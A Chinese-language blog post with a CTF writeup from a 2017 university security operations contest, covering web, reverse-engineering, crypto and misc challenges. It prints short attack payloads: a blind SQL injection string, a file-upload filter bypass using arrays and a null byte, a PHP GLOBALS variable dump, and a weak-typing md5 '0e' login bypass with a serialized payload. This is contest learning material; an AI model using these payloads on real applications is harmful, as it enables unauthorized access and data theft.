---
layout: post
title: "2017高校网络信息安全管理运维挑战赛writeup"
date: 2017-10-13
description: "2017高校网络信息安全管理运维挑战赛writeup"
tag: writeup
---
跟着朋友打了一下2017的高校运维赛，虽然比赛过程中存在这一些不可描述的东西（比如逃课比赛被老师抓到...等等），总之感谢队友没把我抛弃掉。
比赛末尾主办方让写wp了，写的不是很细，就放到博客上充当一篇博文吧QAQ

### Web
#### Login
用万能密码登录发现姿势错误，然后开始尝试sql盲注
```
Payload：uname=1'^(ord(left(pwd,1))>101)^'0&pwd=1
```
总共30位<br>
可以写脚本也可以试试手注，注到手抽筋<br>
```
fsaoaigafsdfsdubbwouibiaewrawe
```
最后flag
![](/images/2017-11-13/1.png)
```
EIS{SQLI_INJECTIion_blind}
```

#### PHP是最好的语言
[参考链接](http://www.jianshu.com/p/179fa39909f4)<br>
.bak下载源码<br>
![](/images/2017-11-13/2.png)
对着他的payload稍微改了一下
```
EIS{php_th3_b45t_l4ngu4g3}
```

#### 文件上传
![](/images/2017-11-13/3.png)
```
Payload：ext=php&content[]=<?ph&content[]=p%00phpinfo();
```
![](/images/2017-11-13/4.png)
```
EIS{6yp455_with_4rr4y}
```

#### 随机数
![](/images/2017-11-13/5.png)
试了下爆破，神奇的可行，然后就出来了<br>
![](/images/2017-11-13/6.png)
```
EIS{brute_forc3_th3_r4nd0m_s33d}
```

#### PHP代码审计
```
<?php   
error_reporting(0); 
include "flag1.php"; 
highlight_file(__file__); 
if(isset($_GET['args'])){ 
    $args = $_GET['args']; 
    if(!preg_match("/^\w+$/",$args)){ 
        die("args error!"); 
    } 
    eval("var_dump($$args);"); 
}
```
```
Payload：args=GLOBALS
```
![](/images/2017-11-13/7.png)

#### 快速计算
写了个爬虫
有点瑕疵 第二个数如果是三位数的话就会报错
```
import urllib
import urllib2
import re


url = "http://202.120.7.220:2333/"
html = urllib2.urlopen("http://202.120.7.220:2333/").read()
data = {}

num = re.findall("<br/>(.*?)<input type=",html)
print num[0]
print num[0][0:5] + "*" + num[0][6:10] + "+" + num[0][11:15] + "+(" + num[0][17:22] + "+" + num[0][23:28] + ")"

h= int(num[0][0:5])*int(num[0][6:10])+ int(num[0][11:15])*(int(num[0][17:22])+int(num[0][23:28]))
print h

data['v'] = str(h)
post_data = urllib.urlencode(data)
print post_data
html2 = urllib2.urlopen(url, post_data).read()
print html2

```
![](/images/2017-11-13/8.png)

#### PHP trick
```
Payload：?gift=&flag=lag=
```
![](/images/2017-11-13/9.png)
RVF{woshiflag}
凯撒解密一下

#### 不是管理员也能login
主要考查php弱类型
查看说明页面拿到源码，貌似之前也再哪里遇到过
用户名的md5前两位是0e，密码的话是反序列化
md5('s155964671a')=0e342768416822451524974117254469
帐号就是 s155964671a了，密码a:2:{s:3:"pwd";b:1;s:4:"name";b:1;}
![](/images/2017-11-13/10.png)
```
EIS{Smi1E_on_YouR_face_And_in_y0ur_heart}
```

### RE
#### IginteMe
![](/images/2017-11-13/11.png)
分析第一步，发现是C++写的
是时候掏出我的IDA了
F5大法好，首先找到了判断关键
![](/images/2017-11-13/12.png)
查看源码
![](/images/2017-11-13/13.png)
然后就是上脚本了
```
list1 = [0x0D, 0x13, 0x17, 0x11, 0x02, 0x01, 0x20, 0x1D, 0x0C, 0x02, 0x19, 0x2F, 0x17, 0x2B, 0x24, 0x1F, 0x1E, 0x16, 0x09, 0x0F, 0x15, 0x27, 0x13, 0x26, 0x0A, 0x2F, 0x1E, 0x1A, 0x2D, 0x0C, 0x22, 0x04,]
a = b'GONDPHyGjPEKruv{{pj]X@rF'
flag = []
for x, y in zip(list1, a):
    flag.append(((x^y) - 72) ^ 0x55)
print (bytes(flag))
```

#### ReverseMe
这个给的程序无法打开真有点伤，不过不影响做题
![](/images/2017-11-13/14.png)
双击定位到了这里
![](/images/2017-11-13/15.png)
寻找交叉引用拿到源码
![](/images/2017-11-13/16.png)
剩下的就是脚本问题了
![](/images/2017-11-13/17.png)

### crypto
#### easy crypto
![](/images/2017-11-13/18.png)
一个对称加密对着给出的文件逆写python脚本：
![](/images/2017-11-13/19.png)

### Misc
#### 隐藏在黑夜里的秘密
看到有密码而且没发现提示，在想会不会是伪加密
![](/images/2017-11-13/20.png)
查看图片发现惊喜
![](/images/2017-11-13/21.png)

#### 签到题
扫描得flag


可能写的不是很详细，具体大佬们可以联系我